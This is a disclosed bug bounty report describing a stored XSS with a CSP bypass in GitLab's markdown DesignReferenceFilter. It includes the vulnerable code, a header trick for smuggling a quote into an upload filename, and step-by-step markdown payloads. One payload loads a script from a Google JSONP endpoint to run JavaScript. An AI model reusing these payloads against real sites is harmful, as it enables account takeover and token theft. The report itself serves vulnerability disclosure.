# Stored XSS in markdown via the DesignReferenceFilter 

## Report Details
- **Report ID**: 1212067
- **URL**: https://hackerone.com/reports/1212067
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-05-28T14:42:01.389Z
- **Disclosed**: 2021-10-18T05:49:14.373Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
When rendering markdown, links to designs are parsed using the following `link_reference_pattern`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design_management/design.rb#L168
```ruby
    def self.link_reference_pattern
      @link_reference_pattern ||= begin
        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}
        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)
        valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace
        filename_pattern = %r{
          (?<url_filename> #{valid_char}+ \. #{ext})
        }x

        super(path_segment, filename_pattern)
      end
    end
```

The `url_filename` match is then used in `parse_symbol`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design_reference_filter.rb#L75
```ruby
def parse_symbol(raw, match_data)
  filename = match_data[:url_filename]
  iid = match_data[:issue].to_i
  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)
end
```

Since `valid_char` is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched.

The final `url` match gets used when creating the link in `object_link_filter`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract_reference_filter.rb#L219
```ruby
url =
  if matches.names.include?("url") && matches[:url]
    matches[:url]
  else
    url_for_object_cached(object, parent)
  end

content = link_content || object_link_text(object, matches)

link = %(<a href="#{url}" #{data}
            title="#{escape_once(title)}"
            class="#{klass}">#{content}</a>)
```

So if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute.

Normally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a `Content-Disposition` header such as `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''filename.png` which allows for any character to be used as part of the design filename.

Since whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the `a` element. 

Injecting attributes can be chained with the `ReferenceRedactor` to replace the node with arbitrary html via the `data-original` attribute:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/reference_redactor.rb#L77
```ruby
def redacted_node_content(node)
  original_content = node.attr('data-original')
  link_reference = node.attr('data-link-reference')

  # Build the raw <a> tag just with a link as href and content if
  # it's originally a link pattern. We shouldn't return a plain text href.
  original_link =
    if link_reference == 'true'
      href = node.attr('href')
      content = original_content

      %(<a href="#{href}">#{content}</a>)
    end
```

For a CSP bypass, the jsonp endpoint of the google api can be used in combination with `setTimeout`:
`https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`

### Steps to reproduce

1. Create a new project on gitlab.com
2. Create a new issue
3. Make sure burp or similar is running
4. Upload a new design
5. Edit the request and change the Content-Disposition header to `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`
6. Refresh the page, there should now be a design named `bbb"class="gfm"a='.png`
7. Create a new issue using the design link and the inner html containing a quote:
```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' vakzz=here
</a>
```
8. Looking at the markup you can see the `a` attribute contains everything up to the inner html and then the attribute `vakzz` has also been injected:
```html
<a href="https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb" class="gfm" a=".png&quot; data-original=&quot;
' vakzz=here
&quot; data-link=&quot;true&quot; data-link-reference=&quot;true&quot; data-project=&quot;26924211&quot; data-design=&quot;226146&quot; data-issue=&quot;87875440&quot; data-reference-type=&quot;design&quot; data-container=&quot;body&quot; data-placement=&quot;top&quot;
                          title=&quot;bbb&quot;class=&quot;gfm&quot;a='.png&quot;
                          class=&quot;gfm gfm-design has-tooltip&quot;>
" vakzz="here"></a>
```
7. Create a new issue using the design link, this time including the required data attributed to trigger the `ReferenceRedactor` and the payload html encoded in the `data-original`:

```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="
  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
"
</a>
```
8. Save the issue and reload the page

{F1318763}

### Impact
Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

### Examples
POC:
https://gitlab.com/vakzz-h1/design-xss/-/issues/3

### What is the current *bug* behavior?
* The `AbstractReferenceFilter` is generating the `link` using string interpolation but the `url` could contain double quotes
* The design model  can have an arbitrary` attribute

### What is the expected *correct* behavior?
* The url should be validated or escaped before being used
* The design model could probably have a validator for the filename

### Relevant logs and/or screenshots

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

## Attachments
- xss.mp4
